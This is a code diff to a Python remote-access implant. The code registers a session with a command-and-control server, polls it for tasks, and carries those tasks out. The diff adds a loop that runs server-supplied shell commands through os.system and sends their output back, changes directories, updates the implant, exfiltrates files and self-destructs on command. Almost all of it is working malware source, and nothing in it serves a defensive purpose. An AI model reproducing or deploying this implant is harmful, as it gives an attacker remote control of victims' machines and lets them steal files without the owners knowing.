@@ -43,7 +43,6 @@ def MakePath(dir):
 #Changes the directory similarily to the way linux cd does given a string consisting of .., and directories seperated by '/'.
 def ChangeDir(cwd, newDir):
     newWD = MakePath(newDir)
-    print(newWD)
     if os.path.isdir(newWD):
         os.chdir(newWD)
         if cwd != os.getcwd():
@@ -58,8 +57,8 @@ def ChangeDir(cwd, newDir):
         urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
     return cwd
 
-def CommandExec():
-    command = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}').read().decode("utf-8")
+def CommandExec(command):
+    #command = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}').read().decode("utf-8")
     os.system(command) #runs the command from our C2 server on the target
     commanddata = os.popen(command)
     commanddatatext = urllib.parse.quote_plus(commanddata.read())
@@ -71,9 +70,31 @@ def CommandExec():
 #initialiazation, this will set establish a Session ID
 if(os.path.isfile("sid.log")):
     sid = open("sid.log", "r").read()
-    urllib.request.urlopen(f'{c2}/reconnect?sid={sid}&cwd={cwd}')
+    dir = urllib.parse.quote_plus(cwd)
+    urllib.request.urlopen(f'{c2}/reconnect?sid={sid}&cwd={dir}')
 else:
-    sid = urllib.request.urlopen(f'{c2}/?cwd={cwd}').read().decode("utf-8")
+    dir = urllib.parse.quote_plus(cwd)
+    sid = urllib.request.urlopen(f'{c2}/?cwd={dir}').read().decode("utf-8")
     f = open("sid.log", "w")
     f.write(sid)
     f.close()
+
+while True:
+    next = urllib.request.urlopen(f'{c2}/next?sid={sid}').read().decode("utf-8")
+    if next == 'wait':
+        time.sleep(10)
+    else:
+        next = next.split(' ', 1)
+        if next[0] == 'cexe':
+            CommandExec(next[1])
+        elif next[0] == 'cd':
+            cwd = ChangeDir(cwd, next[1])
+        elif next[0] == 'update':
+            UpdateImplant()
+        elif next[0] == 'exfil':
+            ExfilFile(next[1], c2, c2IPAdress)
+        elif next[0] == 'selfdestruct':
+            SelfDestruct()
+        else:
+            time.sleep(10)
+        time.sleep(5)
